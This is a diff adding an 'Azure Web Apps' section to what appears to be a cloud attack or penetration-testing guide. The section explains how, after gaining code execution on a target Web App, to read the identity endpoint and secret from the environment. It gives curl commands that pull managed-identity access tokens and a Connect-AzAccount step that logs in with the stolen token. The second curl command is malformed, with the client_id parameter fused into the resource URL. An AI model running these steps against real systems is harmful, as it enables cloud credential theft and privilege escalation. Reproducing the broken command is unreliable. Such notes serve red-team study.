@@ -43,6 +43,23 @@ They could attach it to a compromised resource (like a VM they control)
 
 Use the new token to escalate privileges or exfiltrate data
 
+## Azure Web Apps
+
+Upon finding an RCE vulnerability or have access to the target Web App somehow, run the env command to find the IMDS location (MSI_ENDPOINT/IDENTITY_ENDPOINT) with the MSI_SECRET/IDENTITY_HEADER value to request credentials for an associated system or user-managed managed identity if enabled.
+
+### 1) Request IMDS for credentials
+
+    curl -s -H "X-Identity-Header: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"
+
+### 2) Request a specific Client ID, obtained from the env output
+
+    curl -s -H "X-Identity-Header: $MSI_SECRET" "$MSI_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/client_id=$ENTRA_CLIENT_ID"
+
+### 3) Authenticate
+
+    $mitoken = "TOKEN"
+    Connect-AzAccount -AccessToken $mitoken -AccountID "APP_NAME"
+    
 ## Steps
 
 ### 1) Get an Azure access token from a VM
